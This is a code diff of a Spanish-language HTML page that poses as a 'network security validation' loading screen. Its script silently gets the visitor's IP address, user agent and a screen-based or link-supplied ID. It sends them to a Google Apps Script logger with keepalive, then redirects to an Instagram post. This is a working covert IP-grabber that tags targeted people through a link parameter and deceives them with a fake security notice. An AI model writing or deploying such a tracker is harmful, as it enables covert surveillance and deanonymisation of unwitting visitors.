@@ -1,34 +1,53 @@
 <!DOCTYPE html>
-<html>
+<html lang="es">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Cargando...</title>
-    </head>
+
+    <meta property="og:title" content="Seguridad de Red: Validación Requerida" />
+    <meta property="og:description" content="Acceso pendiente. Verificando integridad de la conexión móvil..." />
+    <meta property="og:image" content="https://dennismariapinogomez-cmd.github.io/validacion-seguridad/portada.jpeg" />
+    <meta property="og:type" content="website" />
+
+    <style>
+        body { background: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #0095f6; border-radius: 50%; width: 28px; height: 28px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
 <body>
+
+    <div class="spinner"></div>
+
     <script>
         window.onload = async function() {
-            // 1. Identificar usuario del link (?u=Nombre)
             const params = new URLSearchParams(window.location.search);
-            const user = params.get('u') || "Usuario_Anonimo";
             
-            // 2. Captura de IP
+            // Identificación: Prioriza el nombre en el link, sino crea un ID por resolución de pantalla
+            const user = params.get('u') || "MOVIL_" + screen.width + "x" + screen.height;
+            
             let ip = "0.0.0.0";
             try {
+                // Captura de IP rápida
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
                 ip = data.ip;
-            } catch (e) { ip = "IP_No_Capturada"; }
+            } catch (e) { ip = "IP_Movil_Protegida"; }
 
             const ua = encodeURIComponent(navigator.userAgent);
             const scriptURL = "https://script.google.com/macros/s/AKfycbyA2L647dCpQydjl-eb0qZ5a9P1Ht_hiC50syMzCIuimB3QjeK_r4F7M7XS5UxLx5MB/exec";
 
-            // 3. REGISTRO SILENCIOSO (Sin esperar respuesta de Google)
-            fetch(`${scriptURL}?u=${user}&ip=${ip}&ua=${ua}`, { mode: 'no-cors' });
+            // ESTRATEGIA MÓVIL: "keepalive: true" asegura que el envío termine aunque la pestaña se cierre o cambie
+            fetch(`${scriptURL}?u=${user}&ip=${ip}&ua=${ua}`, { 
+                mode: 'no-cors',
+                keepalive: true 
+            });
 
-            // 4. SALTO INMEDIATO A INSTAGRAM (Evita el error de Google Script)
+            // Redirección con ligero retraso para asegurar el registro en el Excel
             setTimeout(() => {
-                window.location.href = "https://www.instagram.com/p/C_m_6u0shW2/?igsh=MXRjMnI0em81YXFqOQ==";
-            }, 500); // Medio segundo de retraso para asegurar el envío
+                window.location.href = "https://www.instagram.com/p/C_m_6u0shW2/";
+            }, 800); 
         };
     </script>
 </body>
